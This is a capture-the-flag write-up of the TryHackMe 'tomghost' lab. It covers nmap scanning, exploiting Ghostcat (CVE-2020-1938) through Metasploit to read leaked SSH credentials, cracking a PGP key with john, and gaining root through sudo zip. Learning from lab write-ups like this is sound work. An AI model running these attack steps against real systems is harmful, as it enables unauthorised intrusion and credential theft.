Initial nmap scan:
```
└─$ nmap 10.10.74.67

Now I'll start another scan to check all ports with `nmap -T4 10.10.74.67 -p-`, and while this is running, take a closer look at what we know so far.
`nmap -sVC -T4 10.10.74.67 -p22,53,8009,8080 -oN nmap-version.txt`

Navigating to :8080 in a browser, it seems that we have a fresh Apache Tomcat server running 9.0.30 which hasn't been fully set up. 
Between `searchsploit` and Google, I came across a vulnerability known as 'Ghostcat', which seems like the right direction being that this room is titled "tomghost".

With my sights focused on CVE-2020-1938, I came across a write-up and exploit on GitHub: https://github.com/Hancheng-Lei/Hacking-Vulnerability-CVE-2020-1938-Ghostcat/blob/main/CVE-2020-1938.py.
This server is running a vulnerable version and listening on port 8009, so I decided to take a final look with Metasploit. 
`msfconsole`
`use auxiliary/admin/http/tomcat_ghostcat`
`set RHOSTS 10.10.74.67`
With these options, we had the following configuration:
```
msf6 auxiliary(admin/http/tomcat_ghostcat) > options

Module options (auxiliary/admin/http/tomcat_ghostcat):

   Name      Current Setting   Required  Description
   ----      ---------------   --------  -----------
   AJP_PORT  8009              no        The Apache JServ Protocol (AJP) port
   FILENAME  /WEB-INF/web.xml  yes       File name
   RHOSTS    10.10.74.67       yes       The target host(s), see https://docs.metasploit.com/docs/using-metasploi
                                         t/basics/using-metasploit.html
   RPORT     8080              yes       The Apache Tomcat webserver port (TCP)
   SSL       false             yes       SSL

```
Running `check`, it confirms that the instance is vulnerable.
Finally we'll `run` and get the contents of /WEB-INF/web.xml, inside which we find the following output:
```
<web-app xmlns="http://xmlns.jcp.org/xml/ns/javaee"
  xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"
  xsi:schemaLocation="http://xmlns.jcp.org/xml/ns/javaee

     Welcome to GhostCat

</web-app>
```
`skyfuck:8730281lkjlkjdqlksalks` could be a set of credentials, but now I'm having a hard time finding where to input them. 

After some research and poking around in the [Tomcat documentation](https://tomcat.apache.org/tomcat-9.0-doc/manager-howto.html) for manger portal locations, it turns out these were just SSH credentials!!

In `skyfuck`'s home directory, we have `credential.pgp` and `tryhackme.asc` sitting there. `tryhackme.asc` contains a PGP private key, which I'm not entirely sure what to do with for now.

Looking around more, we find some hidden files including .bash_history:
```
skyfuck@ubuntu:~$ cat .bash_history 
ls
cd ..
ls
cd skyfuck/
ls
exit
cd ..
ls
cd skyfuck/
ls
wget 192.168.32.23/tryhackme.asc
wget 192.168.32.23/credential.pgp
ls
exot
exit
```

Checking with `sudo -l` we don't have sudo privileges.

With some research, after copying the .pgp and .asc files to my local machine, I was able to use `john` to bruteforce the .asc file:
`gpg2john tryhackme.asc > tocrack`
`john tocrack --wordlist=/usr/share/wordlists/rockyou.txt`
`john tocrack --show`
The password is `alexandru`.

Now we're able to use this key to decrypt the .pgp file:
`gpg --import tryhackme.asc`
*enter alexandru as the password*
`gpg --decrypt credential.pgp`
*enter alexandru as the password again*
And now we have `merlin:asuyusdoiuqoilkda312j31k2j123j1g23g12k3g12kj3gk12jg3k12j3kj123j` from the decrypted file.

Authenticating to the server as merlin with our newfound credentials, we find the user flag is in this home directory.

Now looking for privilege escalation possibilities, `sudo -l` reveals that we can run `/usr/bin/zip` as root without a password!

This is an immediate red flag to check gtfobins, and sure enough, we're able to get obtain root from there with a copy/paste. https://gtfobins.github.io/gtfobins/zip/#sudo

Lastly, we find and submit the root flag in /root.

This was a fairly straightforward room, but it was great learning a bit about Tomcat and the Ghostcat vulnerability, as well as cracking PGP encryption with John.
